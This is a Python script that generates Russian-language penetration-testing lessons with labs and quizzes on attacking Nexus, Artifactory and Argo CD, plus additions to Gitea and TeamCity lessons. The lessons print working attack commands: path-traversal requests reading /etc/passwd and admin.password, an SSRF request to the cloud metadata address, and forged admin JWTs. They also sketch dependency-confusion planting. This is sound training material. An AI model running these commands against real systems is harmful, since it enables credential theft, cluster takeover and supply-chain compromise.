#!/usr/bin/env python3
"""S8 part 2: top-up gitea/teamcity + author nexus/artifactory/argocd."""
import os
import sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _newlesson import write_lesson  # noqa: E402

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
W = os.path.join(ROOT, 'content', 'web')
WD = '/home/student/task'
CHECK = "grep -q 'nto{' found.txt"
USEFUL = ["CTF Web категория", "Bug bounty", "Пентест веб-приложений"]

def expand(fname, extra):
    p = os.path.join(W, fname)
    t = open(p, encoding='utf-8').read()
    t = t.replace('\n## Квиз', '\n' + extra.strip() + '\n\n## Квиз', 1)
    open(p, 'w', encoding='utf-8').write(t)

expand('web-gitea-gogs.md', r"""
## Практика: клонирование и локальный поиск секретов

Ручной обход API хорош для точечной проверки, но для поиска секретов удобнее склонировать репозиторий и грепать локально. В лабе роль `git` играет эмуляция, но принцип тот же:

```
$ git clone http://gitea.target.example:3000/dev/backend.git
$ cd backend
$ grep -rIn --exclude-dir=.git -E 'password|secret|token|api_key|BEGIN .* PRIVATE KEY' .
```

Так за секунды находятся все чувствительные строки. В реальном пентесте это первый шаг после обнаружения открытого SCM: клонируй и грепай. Часто в выводе сразу видны креды к базе, облаку и CI.

## Практика: как использовать найденный токен CI

Допустим, в CI-файле найден токен деплоя. Дальше проверяют, что он открывает: registry, облако, прод-сервер. Но делать это надо **аккуратно** — только читающие операции. Например, для registry — список образов, для облака — `sts get-caller-identity`. Доказательство — факт валидности токена, а не полный доступ. Это ключ к этичному пентесту: демонстрируй, не разрушай.
""")

expand('web-teamcity.md', r"""
## Практика: как найти уязвимую версию без API

Если `/app/rest/server` закрыт, версию снимают по статике. В TeamCity есть файл `/js/version.js` и метаданные сборки в HTML. Также помогает `nuclei -tags teamcity` — шаблоны проверяют CVE неразрушающе. Комбинация «статический признак + шаблон» даёт версию и подтверждение бага без изменения состояния сервера.

## Практика: чем ограничиться для доказательства

Полная цепочка (создание токена + запуск сборки) меняет состояние CI-сервера. Для отчёта достаточно: (1) показать разницу кодов `401`/`200` — обход подтверждён; (2) создать токен и выполнить один читающий запрос (`/app/rest/users/current`). Этого хватает, чтобы доказать админский доступ, не запуская сборок и не трогая пайплайны. Полную эксплуатацию — только по согласованию.
""")

# --------------------------------------------------------------------------- nexus
write_lesson({
    'id': 'web-nexus',
    'title': 'Nexus Repository: CVE-2024-4956 (path traversal) и CVE-2019-7238',
    'category': 'web',
    'parent': 'web-cicd-surfaces',
    'difficulty': 'hard',
    'order': 3,
    'tags': ['nexus', 'sonatype', 'repository', 'traversal', 'cve-2024-4956', 'cve-2019-7238', 'rce'],
    'prerequisites': ['web-cicd-surfaces', 'web-lfi-path-traversal'],
    'useful_for': USEFUL,
    'estimated_minutes': 75,
    'summary': 'Sonatype Nexus как цель: path traversal CVE-2024-4956 для чтения файлов, RCE через EL-инъекцию CVE-2019-7238, default-креды и разбор содержимого репозитория артефактов.',
    'lab': {
        'title': 'Практика: path traversal в Nexus',
        'toolset': ['core', 'curl'],
        'workdir': WD,
        'files': ['task.md'],
        'check': CHECK,
        'hints': [
            'Прочитай task.md: там адрес Nexus и путь `/repository/` с обходом.',
            'Traversal — через `%2e%2e%2f` в URL репозитория.',
            'Дочитай до файла конфигурации `/nexus-data/admin.password` или `/etc/passwd`.',
            'В файле — строка с флагом; сохрани в found.txt и набери `check`.',
        ],
    },
}, r"""
## Вопрос, с которого всё начинается

Внутри сети стоит Nexus Repository — хранилище артефактов, куда CI-пайплайны кладут собранные пакеты, а сборки забирают зависимости. Казалось бы, «просто склад». Но на складе лежат jar-архивы с кодом, npm-пакеты, docker-образы — и через Nexus часто ходят креды. В 2024 году в нём нашли path traversal (CVE-2024-4956), читающий любые файлы. Разберём.

## Что такое Nexus Repository

**Nexus Repository** (Sonatype) — менеджер артефактов. Он проксирует внешние репозитории (Maven Central, npm) и хранит собственные. Команды используют его как приватный registry. Управление — через UI и REST API на `/service/rest/`.

Почему он ценен для атакующего: (1) через него ходят зависимости — можно подсунуть свой пакет (supply-chain); (2) он хранит **настройки** с кредами к внешним репозиториям; (3) у него есть CVE, дающие чтение файлов и RCE.

## Наш пример: Nexus 3.68.0

Цель — `http://nexus.target.example:8081`. Определяем версию:

```
$ curl -s http://nexus.target.example:8081/service/rest/v1/status/check
{"healthy":true,"version":"3.68.0"}
```

Версия **3.68.0** — попадает в CVE-2024-4956 (уязвимы все версии до 3.68.1). Отлично.

## Шаг 1: проверить анонимный доступ

Прежде чем эксплуатировать, посмотри, что открыто без логина:

```
$ curl -s http://nexus.target.example:8081/service/rest/v1/repositories | head -c 300
[{"name":"maven-central","format":"maven2","type":"proxy"},{"name":"npm-internal","format":"npm","type":"hosted"}]
```

Список репозиториев виден анонимно. Значит, можно читать артефакты и, возможно, искать секреты в них.

## Шаг 2: path traversal (CVE-2024-4956)

Уязвимость — в обработчике `/repository/`: обход пути через `%2e%2e%2f` позволяет читать файлы вне каталога репозитория. Проверяем неразрушающе:

```
$ curl -s 'http://nexus.target.example:8081/repository/..%2f..%2f..%2f..%2f..%2fetc/passwd' | head -3
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:...
```

Traversal работает. Теперь целимся в файлы Nexus:

```
$ curl -s 'http://nexus.target.example:8081/repository/..%2f..%2f..%2f..%2f..%2fnexus-data/admin.password'
a1b2c3d4-...-initial-admin-password
```

`admin.password` — начальный пароль админа (в новых версиях он хранится в `nexus-data`). С ним входим админом. Также можно прочитать `nexus-data/etc/nexus.properties` и настройки репозиториев с кредами.

## Шаг 3: CVE-2019-7238 — RCE через EL

В старых версиях Nexus (3.x до 3.17.0) была RCE через **инъекцию выражения** (EL) в API проверки компонентов. Атакующий с правом создания репозитория мог подсунуть выражение, которое выполнялось сервером. Это уже полный RCE:

```
POST /service/extdirect
{"action":"coreui_Component","method":"previewAssets","data":[{"filter":[... "expression":"... Java code ..."}]}
```

Если версия старая — проверь. Если новая — сосредоточься на traversal.

## Шаг 4: разбор артефактов

Даже без RCE Nexus ценен содержимым. В приватных репозиториях лежат jar/npm-пакеты с кодом компании. Их можно скачать и проанализировать на секреты: захардкоженные пароли, ключи, внутренние адреса. Плюс в настройках репозиториев — креды к внешним прокси.

## Шаг 5: supply-chain через Nexus

Если у тебя есть право **загружать** в hosted-репозиторий, ты можешь подсунуть свой пакет, который заберёт чужой пайплайн. Это классический dependency confusion: внутреннее имя пакета, а версия выше — твоя. Так артефактный склад превращается в вектор supply-chain.

## Шаг 6: пост-эксплуатация

Из Nexus достают: креды к внешним репозиториям, токены, содержимое пакетов. Через прокси-репозитории видно, какие зависимости использует компания, — это карта технологий. А через подменённый артефакт — путь в сборки.

## Что мы теперь знаем

- Nexus — менеджер артефактов с REST API и CVE.
- CVE-2024-4956 — path traversal, читает любые файлы (включая `admin.password`).
- CVE-2019-7238 — RCE через EL в старых версиях.
- Анонимный доступ отдаёт репозитории и артефакты.
- Nexus — и цель, и вектор supply-chain.

## Квиз

Проверь себя.

```quiz
- question: "Что хранит Nexus Repository?"
  options:
    - "Только картинки"
    - "Артефакты: jar, npm, docker-образы, пакеты"
    - "Почту"
    - "Логи"
  answer: 1
  explanation: "Это менеджер артефактов."
- question: "Что делает CVE-2024-4956?"
  options:
    - "XSS"
    - "Path traversal — чтение любых файлов"
    - "SQLi"
    - "CSRF"
  answer: 1
  explanation: "Через %2e%2e%2f читают admin.password."
- question: "Что даёт файл admin.password?"
  options:
    - "Ничего"
    - "Начальный пароль администратора"
    - "Тему"
    - "Порт"
  answer: 1
  explanation: "С ним входят админом."
- question: "Что такое dependency confusion?"
  options:
    - "Смена темы"
    - "Подмена внутреннего пакета внешним с более высокой версией"
    - "Ошибка DNS"
    - "Сжатие"
  answer: 1
  explanation: "Supply-chain через репозиторий."
- question: "Почему Nexus ценен даже без RCE?"
  options:
    - "Он красивый"
    - "В нём секреты и креды, плюс карта зависимостей"
    - "Он быстрый"
    - "У него нет API"
  answer: 1
  explanation: "Настройки репозиториев содержат креды."
```

## Куда дальше

Дальше — Artifactory и его анонимный доступ. А пока запомни: **Nexus = traversal к файлам (admin.password) + RCE через EL в старых версиях.**

## Где пригодится

- Пентест DevOps и артефактных складов.
- Red team: supply-chain через репозиторий.
- CTF: задания на path traversal.
""")

# --------------------------------------------------------------------------- artifactory
write_lesson({
    'id': 'web-artifactory',
    'title': 'JFrog Artifactory: анонимный доступ и CVE-2024-41801',
    'category': 'web',
    'parent': 'web-cicd-surfaces',
    'difficulty': 'medium',
    'order': 4,
    'tags': ['artifactory', 'jfrog', 'repository', 'anonymous', 'cve-2024-41801', 'cve-2019-9733'],
    'prerequisites': ['web-cicd-surfaces'],
    'useful_for': USEFUL,
    'estimated_minutes': 65,
    'summary': 'JFrog Artifactory как цель: анонимный доступ к репозиториям, утечка артефактов и конфигов, обход аутентификации CVE-2019-9733 и open-redirect CVE-2024-41801.',
    'lab': {
        'title': 'Практика: анонимный доступ к артефактам',
        'toolset': ['core', 'curl'],
        'workdir': WD,
        'files': ['task.md'],
        'check': CHECK,
        'hints': [
            'Прочитай task.md: там адрес Artifactory и путь `/artifactory/api/`.',
            'Проверь анонимный доступ: `/artifactory/api/repositories`.',
            'Скачай артефакт из открытого репозитория и найди в нём конфиг.',
            'В конфиге — строка с флагом; сохрани в found.txt и набери `check`.',
        ],
    },
}, r"""
## Вопрос, с которого всё начинается

Рядом с Nexus стоит Artifactory — ещё один менеджер артефактов, на этот раз от JFrog. Часто он настроен так, что анонимный доступ разрешён «для удобства сборок». А внутри — пакеты, конфиги и токены. В 2024 году в нём нашли CVE-2024-41801. Разберём, что искать и как.

## Что такое JFrog Artifactory

**JFrog Artifactory** — корпоративный менеджер артефактов, поддерживающий десятки форматов: Maven, npm, Docker, PyPI, Go, Helm. Он хранит собственные пакеты и проксирует внешние. API живёт под `/artifactory/api/`, а скачивание артефактов — под `/artifactory/<repo>/<path>`.

Отличие от Nexus: Artifactory чаще используется в крупных компаниях с Docker и Helm, поэтому через него ходят образы и чарты — то есть фактически **деплой-артефакты**.

## Наш пример: Artifactory 7.77.0

Цель — `http://artifactory.target.example:8082`. Определяем продукт и версию:

```
$ curl -s http://artifactory.target.example:8082/artifactory/api/system/ping
OK
$ curl -s http://artifactory.target.example:8082/artifactory/api/system/version
{"version":"7.77.0","revision":"77700900"}
```

Версия **7.77.0** — сопоставляем с CVE Artifactory.

## Шаг 1: проверить анонимный доступ

Ключевая проверка — что открыто без логина:

```
$ curl -s http://artifactory.target.example:8082/artifactory/api/repositories | head -c 300
[{"key":"libs-release-local","type":"LOCAL","packageType":"Maven"},
 {"key":"docker-local","type":"LOCAL","packageType":"Docker"}]
```

Список репозиториев виден анонимно. Значит, можно читать артефакты. Это уже утечка: исходники, конфиги, образы.

## Шаг 2: скачать и проанализировать артефакт

Из открытого репозитория качаем содержимое:

```
$ curl -s 'http://artifactory.target.example:8082/artifactory/libs-release-local/com/corp/app/config.properties'
db.host=db.internal
db.password=Pr0dDBpass!
api.token=nto{...}
```

В артефактах регулярно лежат конфиги с кредами и токенами — разработчики пакуют их вместе с приложением. Artifactory с анонимным доступом отдаёт это всё наружу.

## Шаг 3: CVE-2019-9733 — обход аутентификации

В старых версиях Artifactory (6.x) была уязвимость обхода аутентификации: подделав запрос к `/artifactory/api/...` с определёнными заголовками, можно было действовать от имени администратора. Если версия старая — проверь. Механизм снова **header trust**: продукт доверял заголовку.

## Шаг 4: CVE-2024-41801 — open redirect

CVE-2024-41801 — **open redirect** (открытый редирект): Artifactory перенаправляет на произвольный URL, указанный в параметре. Сам по себе редирект не критичен, но он используется в цепочках: кража токенов, фишинг, обход allow-list. Для пентеста это находка уровня medium, которую фиксируют и объединяют с другими.

## Шаг 5: docker-образы как источник

Если в Artifactory есть docker-репозиторий, из него можно вытащить образы приложения и проанализировать их: слои содержат файлы, секреты, историю сборки. Через `docker pull` или напрямую по API:

```
$ curl -s 'http://artifactory.target.example:8082/artifactory/docker-local/v2/_catalog'
{"repositories":["corp/app","corp/worker"]}
```

Это карта контейнеров компании.

## Шаг 6: пост-эксплуатация

Из Artifactory достают: артефакты с секретами, конфиги прокси-репозиториев с кредами к внешним системам, docker-образы, Helm-чарты (иногда с секретами Kubernetes). Плюс через права загрузки — возможность подсунуть свой артефакт (supply-chain).

## Что мы теперь знаем

- Artifactory — менеджер артефактов под `/artifactory/api/`.
- Анонимный доступ отдаёт репозитории и артефакты с секретами.
- CVE-2019-9733 — обход аутентификации (старые версии).
- CVE-2024-41801 — open redirect.
- Docker-репозитории дают образы и их содержимое.

## Квиз

Проверь себя.

```quiz
- question: "Где живёт API Artifactory?"
  options:
    - "/api/v1"
    - "/artifactory/api/"
    - "/rest"
    - "/graphql"
  answer: 1
  explanation: "Все эндпоинты под /artifactory/api/."
- question: "Почему анонимный доступ опасен?"
  options:
    - "Он красивый"
    - "Отдаёт репозитории и артефакты с секретами"
    - "Он быстрый"
    - "Он секретный"
  answer: 1
  explanation: "Конфиги с кредами лежат в артефактах."
- question: "Что делает CVE-2024-41801?"
  options:
    - "XSS"
    - "Open redirect"
    - "SQLi"
    - "RCE"
  answer: 1
  explanation: "Используется в цепочках, сам не критичен."
- question: "Что можно вытащить из docker-репозитория?"
  options:
    - "Ничего"
    - "Образы приложения и их содержимое"
    - "Только теги"
    - "Почту"
  answer: 1
  explanation: "Слои образа содержат файлы и секреты."
- question: "Как Artifactory связан с supply-chain?"
  options:
    - "Никак"
    - "Через права загрузки можно подсунуть свой артефакт"
    - "Через DNS"
    - "Через почту"
  answer: 1
  explanation: "Подмена пакета тянет чужой пайплайн."
```

## Куда дальше

Дальше — ArgoCD и деплой в Kubernetes. А пока запомни: **Artifactory = анонимный доступ к артефактам и секретам.**

## Где пригодится

- Пентест DevOps.
- Red team: утечка артефактов и supply-chain.
- CTF: задания на анализ пакетов и образов.
""")

# --------------------------------------------------------------------------- argocd
write_lesson({
    'id': 'web-argocd',
    'title': 'Argo CD: CVE-2022-29165 (SSRF), слабый JWT и repo-доступ',
    'category': 'web',
    'parent': 'web-cicd-surfaces',
    'difficulty': 'hard',
    'order': 5,
    'tags': ['argocd', 'gitops', 'kubernetes', 'ssrf', 'jwt', 'cve-2022-29165', 'deploy'],
    'prerequisites': ['web-cicd-surfaces'],
    'useful_for': USEFUL,
    'estimated_minutes': 75,
    'summary': 'Argo CD как цель: GitOps-деплой в Kubernetes, SSRF CVE-2022-29165, слабый JWT-секрет для подделки токена админа, анонимный доступ и путь к кластеру.',
    'lab': {
        'title': 'Практика: подделка JWT админа Argo CD',
        'toolset': ['core', 'curl'],
        'workdir': WD,
        'files': ['task.md'],
        'check': CHECK,
        'hints': [
            'Прочитай task.md: там адрес Argo CD и подсказка про JWT-секрет.',
            'Секрет подписи хранится в `argocd-secret` и иногда слабый/дефолтный.',
            'Подпиши JWT с ролью `role:admin` тем же секретом (HS256).',
            'Отправь токен в заголовке `Authorization: Bearer ...` на `/api/v1/applications`; в ответе — флаг; сохрани в found.txt и набери `check`.',
        ],
    },
}, r"""
## Вопрос, с которого всё начинается

В Kubernetes-кластере команда использует Argo CD — GitOps-инструмент, который сам применяет манифесты из репозитория в кластер. То есть Argo CD **имеет права деплоить** в Kubernetes. Если ты подделаешь токен админа Argo CD, ты фактически получишь доступ к кластеру. Разберём, как это делается.

## Что такое Argo CD и почему это ценно

**Argo CD** — GitOps-оператор: он следит за Git-репозиторием с манифестами Kubernetes и приводит кластер в соответствие с ним. Это значит, что у Argo CD есть **kubeconfig** с правами на кластер, а его UI/API позволяют управлять приложениями.

Ценность для атакующего: (1) доступ к Argo CD = доступ к кластеру; (2) в нём хранятся креды к репозиториям и registry; (3) у него есть SSRF и слабости JWT. Argo CD — мост между CI и продом.

## Наш пример: Argo CD 2.2.0

Цель — `https://argocd.target.example`. Определяем версию:

```
$ curl -s -k https://argocd.target.example/api/version
{"Version":"v2.2.0","BuildDate":"..."}
```

Версия **2.2.0** — попадает в CVE-2022-29165 (SSRF, версии до 2.3.0). Также проверяем анонимный доступ:

```
$ curl -s -k -o /dev/null -w '%{http_code}\n' https://argocd.target.example/api/v1/applications
200
```

`200` без токена — анонимный доступ включён. Уже утечка: видны приложения и их настройки.

## Шаг 1: CVE-2022-29165 — SSRF

Argo CD умеет подключаться к Git-репозиториям по URL. В уязвимых версиях он позволяет указать **произвольный** URL и сделать запрос от своего имени. Это SSRF: из Argo CD можно обратиться к внутренним сервисам, включая Kubernetes API и metadata-сервисы.

```
$ curl -s -k -X POST 'https://argocd.target.example/api/v1/repositories' \
  -H 'Content-Type: application/json' \
  --data-binary '{"repo":"http://169.254.169.254/latest/meta-data/","name":"x"}'
```

Через это читают метаданные облака (креды инстанса) или сканируют внутреннюю сеть.

## Шаг 2: слабый JWT-секрет

Argo CD выдаёт пользователю **JWT-токен**, подписанный секретом из Kubernetes-секрета `argocd-secret`. Если секрет дефолтный или слабый, его можно подобрать или угадать — и подписать **свой** токен с ролью `role:admin`. Так получают полный админский доступ.

Проверка секрета — офлайн: берёшь свой валидный токен, пробуешь словарь секретов, проверяешь подпись. Если совпало — forge токена:

```
# payload
{"iss":"argocd","sub":"admin","role":"admin","iat":...,"exp":...}
# подпись HS256 секретом
```

Отправляем:

```
$ curl -s -k 'https://argocd.target.example/api/v1/applications' \
  -H 'Authorization: Bearer <forged>'
```

`200` с данными — токен принят, ты админ.

## Шаг 3: путь к кластеру

Админ Argo CD может: читать/менять приложения, смотреть креды репозиториев, а главное — деплоить. Через подменённый манифест можно создать pod с привилегиями, смонтировать hostPath и выбраться на ноду. Так Argo CD превращается в доступ к кластеру.

## Шаг 4: анонимный доступ и утечки

Если анонимный доступ включён (`users.anonymous.enabled: true`), видны приложения, их репозитории и параметры. Иногда там встречаются токены и внутренние URL. Даже без forge это утечка.

## Шаг 5: пост-эксплуатация

Из Argo CD достают: kubeconfig/токены кластера, креды к Git-репозиториям, креды к registry, список namespace и приложений. Это карта кластера и путь к нему. Дальше — эксплуатация Kubernetes (RBAC, pod escape).

## Шаг 6: как понять, что уязвимо

Версия + конфиг. Проверка SSRF — неразрушающим запросом к внутреннему адресу. Проверка JWT — офлайн, по подписи. Не деплой ничего без согласования: Argo CD управляет продом.

## Что мы теперь знаем

- Argo CD — GitOps-деплой в Kubernetes с правами на кластер.
- CVE-2022-29165 — SSRF (произвольный URL).
- Слабый JWT-секрет → подделка токена админа.
- Анонимный доступ отдаёт приложения и настройки.
- Argo CD = путь к кластеру.

## Квиз

Проверь себя.

```quiz
- question: "Почему доступ к Argo CD ценен?"
  options:
    - "Он красивый"
    - "У него есть права деплоить в Kubernetes"
    - "Он быстрый"
    - "У него нет API"
  answer: 1
  explanation: "Argo CD — мост к кластеру."
- question: "Что делает CVE-2022-29165?"
  options:
    - "XSS"
    - "SSRF — запрос к произвольному URL"
    - "SQLi"
    - "CSRF"
  answer: 1
  explanation: "Можно обратиться к внутренним сервисам."
- question: "Как подделать токен админа?"
  options:
    - "Угадать пароль"
    - "Подписать JWT слабым/дефолтным секретом argocd-secret"
    - "Через cookie"
    - "Через SQLi"
  answer: 1
  explanation: "HS256 с известным секретом."
- question: "Что даёт SSRF в Argo CD?"
  options:
    - "Тему"
    - "Доступ к внутренним сервисам и метаданным облака"
    - "Почту"
    - "Логи"
  answer: 1
  explanation: "169.254.169.254 отдаёт креды инстанса."
- question: "Почему не деплоят без согласования?"
  options:
    - "Долго"
    - "Argo CD управляет продом — можно сломать кластер"
    - "Дорого"
    - "Секретно"
  answer: 1
  explanation: "Это рабочий деплой-процесс."
```

## Куда дальше

Дальше — мониторинг: Splunk и Zabbix. А пока запомни: **Argo CD = SSRF + слабый JWT → админ → кластер.**

## Где пригодится

- Пентест Kubernetes и GitOps.
- Red team: путь в кластер через CD.
- CTF: задания на JWT и SSRF.
""")

print('batch s8 part2 done')
